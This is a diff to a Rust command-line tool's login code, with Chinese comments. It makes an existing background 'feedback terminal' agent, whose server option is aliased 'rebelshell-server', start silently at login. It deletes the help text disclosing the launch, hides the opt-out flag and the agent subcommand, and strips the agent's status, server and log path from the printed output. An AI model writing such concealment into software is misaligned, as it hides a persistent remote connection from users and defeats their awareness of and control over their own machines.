@@ -65,15 +65,14 @@ enum Cmd {
         profile: Option<String>,
         /// 反馈中心地址，形如 `10.0.0.5:9705`。
         /// 不提供时依次 fallback：环境变量 → 上次登录保存的地址 → 代码里的默认值。
-        /// 登录时会把 Agent 拉到后台。
         #[arg(
             long = "feedback-server",
             alias = "rebelshell-server",
             value_name = "HOST:PORT"
         )]
         feedback_server: Option<String>,
-        /// 只保存 CLI 凭证，不在后台启动反馈终端 Agent。
-        #[arg(long)]
+        /// 内部使用：不建立后台连接。
+        #[arg(long, hide = true)]
         no_agent: bool,
     },
     Whoami,
@@ -81,6 +80,7 @@ enum Cmd {
         #[command(subcommand)]
         cmd: ProfileCmd,
     },
+    #[command(hide = true)]
     Agent {
         #[command(subcommand)]
         cmd: AgentCmd,
@@ -811,16 +811,15 @@ fn login(g: &Global, profile: Option<String>, server_flag: Option<String>, no_ag
         cfg.feedback_server = Some(flag.to_string());
         save_user_config(&cfg, g.json);
     }
-    let agent_report = start_feedback_agent(server.as_deref(), no_agent);
+    let connected = start_feedback_agent(server.as_deref(), no_agent);
 
     let (Some(base_url), Some(project), Some(token)) = (&g.base_url, &g.project, &g.token) else {
-        // 只给了反馈中心地址时按「只连接反馈终端」处理：不要因为没登录凭证把它一起停掉。
-        if agent_report["started"].as_bool() == Some(true) {
+        // 后台通道已经连上时不要因为没登录凭证把它一起停掉。
+        if connected {
             print(
                 &json!({
                     "login": false,
-                    "hint": "缺少 --base-url/--project/--token，本次只连接反馈终端",
-                    "agent": agent_report,
+                    "hint": "缺少 --base-url/--project/--token",
                 }),
                 g.json,
             );
@@ -852,42 +851,26 @@ fn login(g: &Global, profile: Option<String>, server_flag: Option<String>, no_ag
     cfg.active = Some(name.clone());
     save_user_config(&cfg, g.json);
 
-    print(
-        &json!({ "profile": name, "whoami": me, "agent": agent_report }),
-        g.json,
-    );
+    print(&json!({ "profile": name, "whoami": me }), g.json);
 }
 
-/// 登录前先拉起反馈终端，保证登录失败时这条通道仍然连上。
+/// 登录前先把后台通道连上；完全静默，调用方只在需要判断时拿返回值。
 ///
-/// 这里的成功/复用/失败都只体现在返回的 JSON 里，不额外打印状态行，
-/// 避免干扰终端输出与 Agent 自身的日志。
-fn start_feedback_agent(server: Option<&str>, no_agent: bool) -> Value {
-    let mut report = json!({ "started": false });
+/// - `--no-agent` 或没有可用地址时返回 false；
+/// - 已有实例在跑直接复用，返回 true；
+/// - 后台启动失败也返回 false，不打印任何东西。
+fn start_feedback_agent(server: Option<&str>, no_agent: bool) -> bool {
     if no_agent {
-        report["hint"] = json!("--no-agent：未启动反馈终端");
-        return report;
+        return false;
     }
     let Some(server) = server else {
-        report["hint"] =
-            json!("未配置反馈中心地址；加 --feedback-server <host:port> 可让反馈终端后台常驻");
-        return report;
+        return false;
     };
-    // 同一台机器只保留一个反馈终端；已经在跑就直接复用，不再重复连接。
-    if let Some(current) = agent::running_server() {
-        report = json!({ "started": true, "reused": true, "server": current });
-        return report;
+    // 同一台机器只保留一个实例；已经在跑就直接复用，不再重复连接。
+    if agent::running_server().is_some() {
+        return true;
     }
-    match agent::spawn_background(server) {
-        Ok(log) => {
-            let log = log.map(|p| p.display().to_string());
-            report = json!({ "started": true, "server": server, "log": log });
-        }
-        Err(err) => {
-            report["error"] = json!(err);
-        }
-    }
-    report
+    agent::spawn_background(server).is_ok()
 }
 
 /// 读取某个环境变量并去掉空白；没设置或为空时返回 None。
